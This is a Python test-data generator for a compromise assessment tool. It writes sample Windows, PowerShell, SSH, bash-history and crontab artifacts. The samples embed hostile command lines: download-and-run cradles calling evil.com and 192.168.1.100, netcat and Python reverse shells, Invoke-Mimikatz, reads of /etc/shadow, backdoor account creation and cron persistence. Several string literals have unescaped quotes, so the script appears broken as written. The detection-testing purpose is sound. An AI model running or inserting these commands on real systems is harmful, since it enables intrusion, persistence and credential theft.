
"""
Test Data Generator for Compromise Assessment Tool
Generates sample forensic artifacts for testing purposes
"""

import os
import random
from datetime import datetime, timedelta

def generate_sample_windows_security_log(filepath: str, num_events: int = 100):
    """Generate sample Windows Security Event Log"""
    events = []
    base_time = datetime.now() - timedelta(days=7)

    event_templates = [
        ("4624", "Successful Logon", "An account was successfully logged on."),
        ("4625", "Failed Logon", "An account failed to log on."),
        ("4648", "Explicit Credential Logon", "A logon was attempted using explicit credentials."),
        ("4672", "Special Privileges", "Special privileges assigned to new logon."),
        ("4720", "User Account Created", "A user account was created."),
        ("4728", "Member Added to Group", "A member was added to a security-enabled global group."),
        ("7045", "Service Installed", "A service was installed in the system."),
    ]

    # Generate brute force pattern (many failed logins)
    for i in range(20):
        time = base_time + timedelta(hours=random.randint(0, 24))
        events.append(f"Event ID: 4625\t{time}\tFailed Logon\tSource: 192.168.1.{random.randint(1, 255)}")

    # Generate successful login after brute force
    time = base_time + timedelta(hours=25)
    events.append(f"Event ID: 4624\t{time}\tSuccessful Logon\tSource: 192.168.1.100")

    # Generate service installation (persistence)
    time = base_time + timedelta(days=2)
    events.append(f"Event ID: 7045\t{time}\tService Installed\tServiceName: UpdateService\tImagePath: C:\\temp\\svchost.exe")

    # Generate random events
    for i in range(num_events - 22):
        event_id, event_name, description = random.choice(event_templates)
        time = base_time + timedelta(days=random.randint(0, 7), hours=random.randint(0, 23))
        events.append(f"Event ID: {event_id}\t{time}\t{event_name}\t{description}")

    with open(filepath, 'w') as f:
        f.write("\n".join(events))

    print(f"Generated Windows Security log: {filepath}")

def generate_sample_powershell_log(filepath: str):
    """Generate sample PowerShell operational log with suspicious activity"""
    commands = [
        "powershell.exe -ExecutionPolicy Bypass -File script.ps1",
        "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
        "powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"",
        "powershell.exe Invoke-Mimikatz -DumpCreds",
        "powershell.exe -noprofile -command "Get-Process | Out-File C:\\temp\\procs.txt"",
        "Get-WmiObject -Class Win32_Process | Select-Object Name, ProcessId",
        "Invoke-Expression -Command "calc.exe"",
    ]

    logs = []
    base_time = datetime.now() - timedelta(days=3)

    for i, cmd in enumerate(commands):
        time = base_time + timedelta(hours=i*2)
        logs.append(f"{time}\tCommandLine={cmd}\tUser=Administrator")

    with open(filepath, 'w') as f:
        f.write("\n".join(logs))

    print(f"Generated PowerShell log: {filepath}")

def generate_sample_bash_history(filepath: str):
    """Generate sample bash history with suspicious commands"""
    commands = [
        "ls -la",
        "cd /tmp",
        "wget http://suspicious.com/backdoor.sh",
        "chmod +x backdoor.sh",
        "./backdoor.sh",
        "nc -e /bin/bash 192.168.1.100 4444",
        "python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'",
        "curl -s http://192.168.1.100/payload | bash",
        "base64 -d <<< YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ== | bash",
        "crontab -l",
        "echo '* * * * * /tmp/backdoor.sh' | crontab -",
        "sudo su -",
        "cat /etc/shadow",
        "useradd -m -G sudo backdoor",
        "passwd backdoor",
        "iptables -F",
        "service ssh stop",
        "python -m http.server 8080 &",
        "nohup nc -lvnp 1234 &",
        "disown",
    ]

    with open(filepath, 'w') as f:
        f.write("\n".join(commands))

    print(f"Generated bash history: {filepath}")

def generate_sample_ssh_log(filepath: str):
    """Generate sample SSH authentication log"""
    logs = []
    base_time = datetime.now() - timedelta(days=5)

    # Generate brute force attempts
    for i in range(50):
        time = base_time + timedelta(minutes=i*2)
        logs.append(f"{time} sshd[1234]: Failed password for root from 192.168.1.200 port {50000+i} ssh2")

    # Successful login after brute force
    time = base_time + timedelta(hours=2)
    logs.append(f"{time} sshd[1234]: Accepted password for root from 192.168.1.200 port 55555 ssh2")

    # Additional successful logins from same IP
    for i in range(5):
        time = base_time + timedelta(hours=2, minutes=i*10)
        logs.append(f"{time} sshd[1234]: Accepted password for root from 192.168.1.200 port {56000+i} ssh2")

    with open(filepath, 'w') as f:
        f.write("\n".join(logs))

    print(f"Generated SSH log: {filepath}")

def generate_sample_cron(filepath: str):
    """Generate sample crontab with suspicious entries"""
    cron_entries = [
        "# Normal system cron jobs",
        "0 * * * * /usr/local/bin/backup.sh",
        "# Suspicious entries below",
        "*/5 * * * * wget -q -O - http://192.168.1.100/update | bash",
        "@reboot /tmp/persistence.sh",
        "* * * * * nc -e /bin/bash 192.168.1.100 4444",
        "0 0 * * * curl -s http://evil.com/steal.sh | bash",
        "*/10 * * * * python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.100",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'",
    ]

    with open(filepath, 'w') as f:
        f.write("\n".join(cron_entries))

    print(f"Generated crontab: {filepath}")

def generate_all_test_data(base_dir: str = "test_data"):
    """Generate all test data"""
    os.makedirs(f"{base_dir}/windows", exist_ok=True)
    os.makedirs(f"{base_dir}/linux", exist_ok=True)

    print("\n[+] Generating test data...\n")

    # Windows test data
    generate_sample_windows_security_log(f"{base_dir}/windows/security_events.log")
    generate_sample_powershell_log(f"{base_dir}/windows/powershell_operational.log")

    # Linux test data
    generate_sample_bash_history(f"{base_dir}/linux/.bash_history")
    generate_sample_ssh_log(f"{base_dir}/linux/auth.log")
    generate_sample_cron(f"{base_dir}/linux/crontab")

    print(f"\n[+] Test data generated in: {base_dir}/")

if __name__ == "__main__":
    generate_all_test_data()
